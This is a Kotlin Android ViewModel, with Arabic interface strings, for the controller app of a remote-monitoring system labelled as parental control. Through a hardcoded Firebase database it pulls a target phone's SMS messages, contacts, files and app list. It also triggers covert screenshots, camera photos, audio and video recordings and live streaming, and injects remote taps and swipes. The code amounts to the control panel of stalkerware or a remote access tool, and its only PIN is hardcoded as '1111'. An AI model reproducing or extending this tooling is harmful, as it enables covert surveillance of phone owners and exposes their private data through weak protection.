package com.example.admin

import android.app.Application
import android.content.Context
import android.media.AudioManager
import android.media.MediaPlayer
import android.media.ToneGenerator
import android.os.Build
import android.os.VibrationEffect
import android.os.Vibrator
import android.os.VibratorManager
import android.util.Log
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import java.io.File
import java.io.FileOutputStream

enum class CommandStepStatus {
    IDLE,
    RUNNING,
    SUCCESS,
    FAILED
}

data class ActiveCommandProgress(
    val commandType: String,
    val commandLabel: String,
    val sendStatus: CommandStepStatus = CommandStepStatus.IDLE,
    val sendError: String? = null,
    val executionStatus: CommandStepStatus = CommandStepStatus.IDLE,
    val executionError: String? = null,
    val resultMessage: String? = null,
    val startTimestamp: Long = System.currentTimeMillis(),
    val responseData: Any? = null
)

class AdminViewModel(application: Application) : AndroidViewModel(application) {
    private val connector = FirebaseAdminConnector()

    // PIN protection state
    private val _isUnlocked = MutableStateFlow(false)
    val isUnlocked: StateFlow<Boolean> = _isUnlocked.asStateFlow()

    // Devices & Loading states
    private val _devices = MutableStateFlow<List<Device>>(emptyList())
    val devices: StateFlow<List<Device>> = _devices.asStateFlow()

    private val _selectedDeviceToken = MutableStateFlow<String?>(null)
    val selectedDeviceToken: StateFlow<String?> = _selectedDeviceToken.asStateFlow()

    private val _isLoading = MutableStateFlow(false)
    val isLoading: StateFlow<Boolean> = _isLoading.asStateFlow()

    // Device-specific sync states
    private val _smsLogs = MutableStateFlow<List<SmsLog>>(emptyList())
    val smsLogs: StateFlow<List<SmsLog>> = _smsLogs.asStateFlow()

    private val _securityAlerts = MutableStateFlow<List<SecurityAlert>>(emptyList())
    val securityAlerts: StateFlow<List<SecurityAlert>> = _securityAlerts.asStateFlow()

    private val _installedApps = MutableStateFlow<List<InstalledApp>>(emptyList())
    val installedApps: StateFlow<List<InstalledApp>> = _installedApps.asStateFlow()

    private val _fileItems = MutableStateFlow<List<FileItem>>(emptyList())
    val fileItems: StateFlow<List<FileItem>> = _fileItems.asStateFlow()

    private val _currentPath = MutableStateFlow("/storage/emulated/0")
    val currentPath: StateFlow<String> = _currentPath.asStateFlow()

    // Media and responses states
    private val _screenshots = MutableStateFlow<List<MediaItem>>(emptyList())
    val screenshots: StateFlow<List<MediaItem>> = _screenshots.asStateFlow()

    private val _cameraPhotos = MutableStateFlow<List<MediaItem>>(emptyList())
    val cameraPhotos: StateFlow<List<MediaItem>> = _cameraPhotos.asStateFlow()

    private val _cameraVideos = MutableStateFlow<List<MediaItem>>(emptyList())
    val cameraVideos: StateFlow<List<MediaItem>> = _cameraVideos.asStateFlow()

    private val _audioRecords = MutableStateFlow<List<MediaItem>>(emptyList())
    val audioRecords: StateFlow<List<MediaItem>> = _audioRecords.asStateFlow()

    private val _contacts = MutableStateFlow<List<Contact>>(emptyList())
    val contacts: StateFlow<List<Contact>> = _contacts.asStateFlow()

    private val _commandResponse = MutableStateFlow<Pair<String, String>?>(null)
    val commandResponse: StateFlow<Pair<String, String>?> = _commandResponse.asStateFlow()

    private val _statusMessage = MutableStateFlow<String?>(null)
    val statusMessage: StateFlow<String?> = _statusMessage.asStateFlow()

    private val _liveStreamState = MutableStateFlow<LiveStreamState?>(null)
    val liveStreamState: StateFlow<LiveStreamState?> = _liveStreamState.asStateFlow()

    private val _activeCommandProgress = MutableStateFlow<ActiveCommandProgress?>(null)
    val activeCommandProgress: StateFlow<ActiveCommandProgress?> = _activeCommandProgress.asStateFlow()

    private val _directScreenshotToShow = MutableStateFlow<MediaItem?>(null)
    val directScreenshotToShow: StateFlow<MediaItem?> = _directScreenshotToShow.asStateFlow()

    private val _directPhotoToShow = MutableStateFlow<MediaItem?>(null)
    val directPhotoToShow: StateFlow<MediaItem?> = _directPhotoToShow.asStateFlow()

    private val _isRefreshing = MutableStateFlow(false)
    val isRefreshing: StateFlow<Boolean> = _isRefreshing.asStateFlow()

    fun clearActiveCommandProgress() {
        _activeCommandProgress.value = null
    }

    fun clearDirectScreenshot() {
        _directScreenshotToShow.value = null
    }

    fun clearDirectPhoto() {
        _directPhotoToShow.value = null
    }

    // Polling and synchronization jobs
    private var syncJob: Job? = null
    private var streamPollingJob: Job? = null
    private var lastKnownAlertTime = 0L

    // Database URL and status states
    private val prefs = application.getSharedPreferences("admin_prefs", Context.MODE_PRIVATE)
    
    private val _currentDatabaseUrl = MutableStateFlow(
        prefs.getString("db_url", "https://studio-3242759193-af8cb-default-rtdb.firebaseio.com") ?: "https://studio-3242759193-af8cb-default-rtdb.firebaseio.com"
    )
    val currentDatabaseUrl: StateFlow<String> = _currentDatabaseUrl.asStateFlow()

    private val _connectionError = MutableStateFlow<String?>(null)
    val connectionError: StateFlow<String?> = _connectionError.asStateFlow()

    // Audio Player State
    private var mediaPlayer: MediaPlayer? = null
    private var tempAudioFile: File? = null
    private var audioProgressJob: Job? = null

    private val _isAudioPlaying = MutableStateFlow(false)
    val isAudioPlaying: StateFlow<Boolean> = _isAudioPlaying.asStateFlow()

    private val _audioDuration = MutableStateFlow(0)
    val audioDuration: StateFlow<Int> = _audioDuration.asStateFlow()

    private val _audioPosition = MutableStateFlow(0)
    val audioPosition: StateFlow<Int> = _audioPosition.asStateFlow()

    init {
        connector.updateRootUrl(_currentDatabaseUrl.value)
        viewModelScope.launch {
            autoDetectDatabaseUrl()
            loadAllDevicesAndStartSync()
        }
    }

    fun updateDatabaseUrl(url: String) {
        val cleanedUrl = url.trim().removeSuffix("/")
        prefs.edit().putString("db_url", cleanedUrl).apply()
        _currentDatabaseUrl.value = cleanedUrl
        connector.updateRootUrl(cleanedUrl)
        _connectionError.value = null
        // Trigger reload
        loadAllDevicesAndStartSync()
    }

    private suspend fun autoDetectDatabaseUrl() {
        val current = _currentDatabaseUrl.value
        val candidates = listOf(
            "https://studio-3242759193-af8cb-default-rtdb.firebaseio.com",
            "https://studio-3242759193-af8cb-default-rtdb.europe-west1.firebasedatabase.app",
            "https://studio-3242759193-af8cb.firebaseio.com",
            "https://studio-3242759193-af8cb.europe-west1.firebasedatabase.app",
            "https://studio-3242759193-af8cb-default-rtdb.asia-southeast1.firebasedatabase.app",
            "https://studio-3242759193-af8cb.asia-southeast1.firebasedatabase.app"
        )
        
        // Try current saved first
        if (testUrlReachable(current)) {
            Log.d("AdminViewModel", "Saved DB URL is working: $current")
            return
        }
        
        // Otherwise, probe candidates
        for (candidate in candidates) {
            if (candidate != current && testUrlReachable(candidate)) {
                Log.d("AdminViewModel", "Found responsive candidate, auto-switching: $candidate")
                updateDatabaseUrl(candidate)
                return
            }
        }
    }

    private suspend fun testUrlReachable(url: String): Boolean = kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
        try {
            val client = okhttp3.OkHttpClient.Builder()
                .connectTimeout(3, java.util.concurrent.TimeUnit.SECONDS)
                .readTimeout(3, java.util.concurrent.TimeUnit.SECONDS)
                .build()
            val req = okhttp3.Request.Builder()
                .url("$url/.json?shallow=true")
                .get()
                .build()
            client.newCall(req).execute().use { resp ->
                // As long as the request resolved (even if permission denied / 401 / 403), it means the URL is reachable
                return@withContext true
            }
        } catch (e: Throwable) {
            Log.e("AdminViewModel", "Database URL $url is not reachable", e)
            return@withContext false
        }
    }

    fun unlockWithPin(pin: String): Boolean {
        return if (pin == "1111") { // Default Parental code is 1111 as requested
            _isUnlocked.value = true
            true
        } else {
            false
        }
    }

    fun lockPIN() {
        _isUnlocked.value = false
    }

    fun clearStatusMessage() {
        _statusMessage.value = null
    }

    fun registerDeviceManually(token: String, name: String) {
        viewModelScope.launch {
            _isLoading.value = true
            val success = connector.registerNewDeviceToken(token, name)
            _isLoading.value = false
            if (success) {
                _statusMessage.value = "تم ربط جهاز الطفل بنجاح!"
                loadAllDevicesAndStartSync()
                selectDevice(token)
            } else {
                _statusMessage.value = "فشل ربط جهاز الطفل، تأكد من الاتصال بقاعدة البيانات."
            }
        }
    }

    fun selectDevice(token: String) {
        _selectedDeviceToken.value = token
        // Reset device dependent views
        _smsLogs.value = emptyList()
        _securityAlerts.value = emptyList()
        _installedApps.value = emptyList()
        _fileItems.value = emptyList()
        _currentPath.value = "/storage/emulated/0"
        _screenshots.value = emptyList()
        _cameraPhotos.value = emptyList()
        _audioRecords.value = emptyList()
        _commandResponse.value = null
        _liveStreamState.value = null
        streamPollingJob?.cancel()
        stopAudio()
        
        // Trigger intermediate fetch
        triggerSingleDeviceFetch(token)
    }

    fun refreshCurrentDevice() {
        val token = _selectedDeviceToken.value ?: return
        viewModelScope.launch {
            _isRefreshing.value = true
            try {
                val list = connector.getDiscoveredDevices()
                _devices.value = list
                syncCurrentDeviceAll(token)
            } catch(e: Exception) {
                Log.e("AdminViewModel", "Error refreshing", e)
            } finally {
                _isRefreshing.value = false
            }
        }
    }

    fun loadAllDevicesAndStartSync() {
        syncJob?.cancel()
        syncJob = viewModelScope.launch {
            while (true) {
                try {
                    val list = connector.getDiscoveredDevices()
                    _devices.value = list
                    _connectionError.value = null

                    _selectedDeviceToken.value?.let { token ->
                        if (token.isNotBlank()) {
                            // Sync current device details and streams
                            syncCurrentDeviceAll(token)
                        }
                    }
                } catch (e: Exception) {
                    Log.e("AdminViewModel", "Error in sync loop", e)
                    _connectionError.value = e.localizedMessage ?: e.message ?: "فشل الاتصال بخادم قاعدة البيانات"
                }
                delay(4000) // Poll every 4 seconds for immediate action
            }
        }
    }

    private fun triggerSingleDeviceFetch(token: String) {
        viewModelScope.launch {
            if (token.isNotBlank()) {
                syncCurrentDeviceAll(token)
            }
        }
    }

    private suspend fun syncCurrentDeviceAll(token: String) {
        if (token.isBlank()) return
        // 1. Fetch SMS Logs
        val sms = connector.getSmsLogs(token)
        _smsLogs.value = sms

        // 2. Fetch Installed Apps
        val apps = connector.getInstalledApps(token)
        _installedApps.value = apps

        // 3. Fetch File System Tree
        val files = connector.getFileSystem(token)
        _fileItems.value = files

        // 4. Fetch Screenshots
        _screenshots.value = connector.getScreenshots(token)

        // 5. Fetch Photos
        _cameraPhotos.value = connector.getCameraPhotos(token)

        // 6. Fetch Videos
        _cameraVideos.value = connector.getCameraVideos(token)

        // 7. Fetch Audio Records
        _audioRecords.value = connector.getAudioRecords(token)

        // 8. Get last command response
        _commandResponse.value = connector.getCommandResponse(token)

        // 9. Fetch Alerts
        val alerts = connector.getSecurityAlerts(token)
        _securityAlerts.value = alerts
        checkForNewAlert(alerts)

        // 10. Fetch Live Stream state silently (if not already fast-polling)
        if (streamPollingJob?.isActive != true) {
            _liveStreamState.value = connector.getLiveStreamState(token)
        }

        // 11. Fetch Contacts
        _contacts.value = connector.getContacts(token)
    }

    private fun checkForNewAlert(alerts: List<SecurityAlert>) {
        if (alerts.isNotEmpty()) {
            val latest = alerts.first()
            if (latest.timestamp > lastKnownAlertTime) {
                lastKnownAlertTime = latest.timestamp
                // If this is not the first boot load of the ViewModel, ring/vibrate
                triggerAlertNotification()
            }
        }
    }

    private fun triggerAlertNotification() {
        val baseContext = getApplication<Application>().applicationContext
        val context = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            baseContext.createAttributionContext("supervisor_control")
        } else {
            baseContext
        }
        
        try {
            // 1. Sound BEEP
            ToneGenerator(AudioManager.STREAM_NOTIFICATION, 100)
                .startTone(ToneGenerator.TONE_PROP_BEEP, 150)

            // 2. Vibrate
            @Suppress("DEPRECATION")
            val vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as? Vibrator
            vibrator?.let {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    it.vibrate(VibrationEffect.createOneShot(450, VibrationEffect.DEFAULT_AMPLITUDE))
                } else {
                    @Suppress("DEPRECATION")
                    it.vibrate(450)
                }
            }
        } catch (e: Throwable) {
            Log.e("AdminViewModel", "Error sounding alert feedback", e)
        }
    }

    private fun getCommandArabicLabel(commandType: String): String {
        return when (commandType) {
            "lock_device" -> "قفل الهاتف"
            "unlock_device" -> "إلغاء قفل الهاتف"
            "take_screenshot" -> "التقاط لقطة شاشة"
            "take_photo" -> "التقاط صورة كاميرا"
            "record_audio" -> "تسجيل صوتي"
            "get_contacts" -> "جلب جهات الاتصال"
            "remote_click" -> "نقر على الشاشة"
            "remote_swipe" -> "سحب على الشاشة"
            "record_video_front" -> "تسجيل فيديو (أمامي)"
            "record_video_back" -> "تسجيل فيديو (خلفي)"
            "list_apps" -> "جلب قائمة التطبيقات"
            "list_directory" -> "استعراض الملفات"
            else -> "تنفيذ الأمر ($commandType)"
        }
    }

    // REMOTE COMMAND DISPATCHER
    fun runCommand(commandType: String, params: Map<String, Any> = emptyMap()) {
        val token = _selectedDeviceToken.value
        if (token == null) {
            _statusMessage.value = "الرجاء تحديد جهاز طفل أولا."
            return
        }

        val label = getCommandArabicLabel(commandType)
        val startTime = System.currentTimeMillis()

        // Before sending, record pre-state
        val preScreenshotTime = _screenshots.value.firstOrNull()?.timestamp ?: 0L
        val prePhotoTime = _cameraPhotos.value.firstOrNull()?.timestamp ?: 0L
        val preAudioTime = _audioRecords.value.firstOrNull()?.timestamp ?: 0L
        val preVideoTime = _cameraVideos.value.firstOrNull()?.timestamp ?: 0L

        _activeCommandProgress.value = ActiveCommandProgress(
            commandType = commandType,
            commandLabel = label,
            sendStatus = CommandStepStatus.RUNNING,
            startTimestamp = startTime
        )

        viewModelScope.launch {
            delay(100)

            // Clear prior command response first in Firebase
            try {
                connector.clearCommandResponse(token)
            } catch(e: Exception) {
                Log.e("AdminViewModel", "Could not clear remote command response", e)
            }

            // Step 1: Sending Command to child device
            val sendSuccess = try {
                connector.sendCommandToChild(token, commandType, params)
            } catch (e: Exception) {
                Log.e("AdminViewModel", "Error in sendCommandToChild", e)
                _activeCommandProgress.value = _activeCommandProgress.value?.copy(
                    sendStatus = CommandStepStatus.FAILED,
                    sendError = e.localizedMessage ?: e.message ?: "فشل في إرسال الأمر عبر الشبكة بسبب مشكلة في الإرسال"
                )
                false
            }

            if (!sendSuccess) {
                if (_activeCommandProgress.value?.sendError == null) {
                    _activeCommandProgress.value = _activeCommandProgress.value?.copy(
                        sendStatus = CommandStepStatus.FAILED,
                        sendError = "لم يتمكن التطبيق من الكتابة بقاعدة بيانات التحكم الأبوي"
                    )
                }
                return@launch
            }

            // Step 1 Success! Move to Step 2
            _activeCommandProgress.value = _activeCommandProgress.value?.copy(
                sendStatus = CommandStepStatus.SUCCESS,
                executionStatus = CommandStepStatus.RUNNING
            )

            // Poll for up to 30 seconds
            val maxSeconds = 30
            val pollIntervalMs = 1500L
            val maxIterations = (maxSeconds * 1000 / pollIntervalMs).toInt()
            var executedSuccessfully = false
            var executionErrorMessage: String? = null

            for (i in 0 until maxIterations) {
                delay(pollIntervalMs)

                // Refresh states
                try {
                    syncCurrentDeviceAll(token)
                } catch (e: Exception) {
                    Log.e("AdminViewModel", "Transient sync error during command polling", e)
                }

                // Inspect if the command was executed by looking at updated states
                when (commandType) {
                    "take_screenshot" -> {
                        val currentScreenshot = _screenshots.value.firstOrNull()
                        if (currentScreenshot != null && currentScreenshot.timestamp > preScreenshotTime) {
                            executedSuccessfully = true
                            _activeCommandProgress.value = _activeCommandProgress.value?.copy(
                                responseData = currentScreenshot
                            )
                        }
                    }
                    "take_photo" -> {
                        val currentPhoto = _cameraPhotos.value.firstOrNull()
                        if (currentPhoto != null && currentPhoto.timestamp > prePhotoTime) {
                            executedSuccessfully = true
                            _activeCommandProgress.value = _activeCommandProgress.value?.copy(
                                responseData = currentPhoto
                            )
                        }
                    }
                    "record_audio" -> {
                        val currentAudio = _audioRecords.value.firstOrNull()
                        if (currentAudio != null && currentAudio.timestamp > preAudioTime) {
                            executedSuccessfully = true
                            _activeCommandProgress.value = _activeCommandProgress.value?.copy(
                                responseData = currentAudio
                            )
                        }
                    }
                    "record_video_front", "record_video_back" -> {
                        val currentVideo = _cameraVideos.value.firstOrNull()
                        if (currentVideo != null && currentVideo.timestamp > preVideoTime) {
                            executedSuccessfully = true
                            _activeCommandProgress.value = _activeCommandProgress.value?.copy(
                                responseData = currentVideo
                            )
                        }
                    }
                    "list_directory" -> {
                        // Wait for general command response status since it updates asynchronously
                    }
                    "list_apps" -> {
                        // Wait for general command response status since it updates asynchronously
                    }
                    "lock_device", "unlock_device" -> {
                        val activeDev = _devices.value.find { it.id == token }
                        val expectedLock = (commandType == "lock_device")
                        if (activeDev != null && activeDev.isLocked == expectedLock) {
                            executedSuccessfully = true
                        }
                    }
                }

                // Check general command responses for success/error tags as fallback or explicit replies
                val lastResponse = _commandResponse.value
                if (lastResponse != null) {
                    val (status, message) = lastResponse
                    if (status == "success" || status == "completed" || status == "done") {
                        executedSuccessfully = true
                        _activeCommandProgress.value = _activeCommandProgress.value?.copy(
                            resultMessage = message
                        )
                    } else if (status == "error" || status == "failed") {
                        executedSuccessfully = false
                        executionErrorMessage = message.ifBlank { "تم رفض التنفيذ أو فشل من طرف هاتف الطفل" }
                        break
                    }
                }

                if (executedSuccessfully) {
                    break
                }
            }

            if (executedSuccessfully) {
                val endProgress = _activeCommandProgress.value?.copy(
                    executionStatus = CommandStepStatus.SUCCESS,
                    resultMessage = _activeCommandProgress.value?.resultMessage ?: "تم استلام الرد وتنفيذ الأمر بنجاح!"
                )
                _activeCommandProgress.value = endProgress

                // Play sound or show directly on screen
                when (commandType) {
                    "record_audio" -> {
                        _audioRecords.value.firstOrNull()?.base64?.let { base64Audio ->
                            loadAndPlayAudio(base64Audio)
                        }
                    }
                    "take_screenshot" -> {
                        _screenshots.value.firstOrNull()?.let { screenshotMedia ->
                            _directScreenshotToShow.value = screenshotMedia
                        }
                    }
                    "take_photo" -> {
                        _cameraPhotos.value.firstOrNull()?.let { photoMedia ->
                            _directPhotoToShow.value = photoMedia
                        }
                    }
                }
            } else {
                _activeCommandProgress.value = _activeCommandProgress.value?.copy(
                    executionStatus = CommandStepStatus.FAILED,
                    executionError = executionErrorMessage ?: "انتهت مهلة الانتظار (30 ثانية) ولم يقم هاتف الطفل بالرد. تأكد من اتصال هاتفه بالإنترنت وتشغيله بالخلفية."
                )
            }
        }
    }

    fun changeLockStatus(shouldLock: Boolean) {
        val command = if (shouldLock) "lock_device" else "unlock_device"
        runCommand(command)
    }

    fun requestScreenshot() {
        runCommand("take_screenshot")
    }

    fun requestPhoto(frontCamera: Boolean) {
        val cameraParam = if (frontCamera) "front" else "back"
        runCommand("take_photo", mapOf(
            "camera" to cameraParam,
            "isFront" to frontCamera
        ))
    }

    fun requestVideo(isFront: Boolean) {
        val command = if (isFront) "record_video_front" else "record_video_back"
        runCommand(command)
    }

    fun requestAudioRecord() {
        runCommand("record_audio")
    }

    fun requestContacts() {
        runCommand("get_contacts")
    }
    
    fun sendRemoteClick(x: Float, y: Float) {
        val params = mapOf("x" to x.toString(), "y" to y.toString())
        runCommand("remote_click", params)
    }

    fun sendRemoteSwipe(x1: Float, y1: Float, x2: Float, y2: Float, duration: Long = 300) {
        val params = mapOf(
            "x1" to x1.toString(),
            "y1" to y1.toString(),
            "x2" to x2.toString(),
            "y2" to y2.toString(),
            "duration" to duration.toString()
        )
        runCommand("remote_swipe", params)
    }

    fun requestAppsList() {
        runCommand("list_apps")
    }

    fun exploreDirectory(path: String) {
        _currentPath.value = path
        runCommand("list_directory", mapOf("path" to path))
    }

    fun clearAlerts() {
        val token = _selectedDeviceToken.value ?: return
        viewModelScope.launch {
            val success = connector.clearSecurityAlerts(token)
            if (success) {
                _securityAlerts.value = emptyList()
                _statusMessage.value = "تم تصفية جدار التنبيهات بنجاح"
            }
        }
    }

    // AUDIO PLAYBACK MANAGEMENT
    fun loadAndPlayAudio(base64Data: String) {
        val baseContext = getApplication<Application>().applicationContext
        val context = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            baseContext.createAttributionContext("supervisor_control")
        } else {
            baseContext
        }

        viewModelScope.launch {
            try {
                stopAudio()
                
                // Write Temp Music File
                val decodedBytes = android.util.Base64.decode(base64Data, android.util.Base64.DEFAULT)
                tempAudioFile = File.createTempFile("child_audio_rx", ".3gp", context.cacheDir).apply {
                    deleteOnExit()
                    FileOutputStream(this).use { fos ->
                        fos.write(decodedBytes)
                    }
                }

                mediaPlayer = MediaPlayer().apply {
                    setDataSource(tempAudioFile!!.absolutePath)
                    prepare()
                    _audioDuration.value = duration
                    start()
                    _isAudioPlaying.value = true
                }

                // Monitor playback progress
                audioProgressJob?.cancel()
                audioProgressJob = viewModelScope.launch {
                    while (_isAudioPlaying.value) {
                        mediaPlayer?.let { mp ->
                            if (mp.isPlaying) {
                                _audioPosition.value = mp.currentPosition
                            } else {
                                _isAudioPlaying.value = false
                            }
                        }
                        delay(250)
                    }
                }

                mediaPlayer?.setOnCompletionListener {
                    stopAudio()
                }

            } catch (e: Exception) {
                Log.e("AdminViewModel", "MediaPlayer playback error", e)
                _statusMessage.value = "فشل تشغيل ملف الصوت المرمز: ${e.localizedMessage}"
            }
        }
    }

    fun pauseAudio() {
        mediaPlayer?.let {
            if (it.isPlaying) {
                it.pause()
                _isAudioPlaying.value = false
            }
        }
    }

    fun resumeAudio() {
        mediaPlayer?.let {
            it.start()
            _isAudioPlaying.value = true
            // Restart progress monitoring
            audioProgressJob?.cancel()
            audioProgressJob = viewModelScope.launch {
                while (_isAudioPlaying.value) {
                    mediaPlayer?.let { mp ->
                        if (mp.isPlaying) {
                            _audioPosition.value = mp.currentPosition
                        } else {
                            _isAudioPlaying.value = false
                        }
                    }
                    delay(250)
                }
            }
        }
    }

    fun seekAudio(positionMs: Int) {
        mediaPlayer?.let {
            it.seekTo(positionMs)
            _audioPosition.value = positionMs
        }
    }

    fun stopAudio() {
        audioProgressJob?.cancel()
        _isAudioPlaying.value = false
        _audioPosition.value = 0
        try {
            mediaPlayer?.apply {
                if (isPlaying) stop()
                release()
            }
        } catch (e: Exception) {
            // Ignore
        }
        mediaPlayer = null
        tempAudioFile?.delete()
        tempAudioFile = null
    }

    fun startLiveStream() {
        val token = _selectedDeviceToken.value ?: return
        runCommand("start_stream")
        
        // Start high-frequency stream-polling
        streamPollingJob?.cancel()
        streamPollingJob = viewModelScope.launch {
            while (true) {
                try {
                    val state = connector.getLiveStreamState(token)
                    _liveStreamState.value = state
                } catch (e: Exception) {
                    Log.e("AdminViewModel", "Error in stream polling", e)
                }
                delay(1200) // Poll every 1.2s
            }
        }
    }

    fun stopLiveStream() {
        val token = _selectedDeviceToken.value ?: return
        runCommand("stop_stream")
        streamPollingJob?.cancel()
        _liveStreamState.value = _liveStreamState.value?.copy(isActive = false)
    }

    fun deleteMediaItem(category: String, itemId: String) {
        val token = _selectedDeviceToken.value ?: return
        viewModelScope.launch {
            val success = connector.deleteMediaItem(token, category, itemId)
            if (success) {
                _statusMessage.value = "تم حذف الملف نهائياً من قاعدة البيانات"
                // Refresh list
                when (category) {
                    "screenshots" -> _screenshots.value = connector.getScreenshots(token)
                    "camera_photos" -> _cameraPhotos.value = connector.getCameraPhotos(token)
                    "audio_records" -> _audioRecords.value = connector.getAudioRecords(token)
                    "video_records" -> _cameraVideos.value = connector.getCameraVideos(token)
                }
            } else {
                _statusMessage.value = "فشل حذف الملف، حاول مرة أخرى"
            }
        }
    }

    override fun onCleared() {
        super.onCleared()
        syncJob?.cancel()
        streamPollingJob?.cancel()
        stopAudio()
    }
}
